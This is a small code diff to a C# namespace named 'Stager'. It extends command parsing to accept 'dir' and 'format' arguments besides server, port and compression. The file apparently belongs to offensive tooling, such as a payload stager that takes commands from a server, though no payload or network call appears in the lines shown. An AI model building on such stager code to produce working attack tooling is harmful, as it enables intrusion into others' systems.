@@ -165,12 +165,11 @@ namespace Stager
                         // Parse the arguments of the command
                         foreach(string s in splitCommandString)
                         {
-                            if (s.Contains("server") || s.Contains("port") || s.Contains("compression"))
+                            if (s.Contains("server") || s.Contains("port") || s.Contains("compression") || s.Contains("dir") || s.Contains("format"))
                             {
                                 string[] tmp = s.Split("=".ToCharArray());
                                 arguments[tmp[0]] = tmp[1];
                             }
-
                         }
 #if DEBUG
                         foreach (KeyValuePair<string, string> kv in arguments)
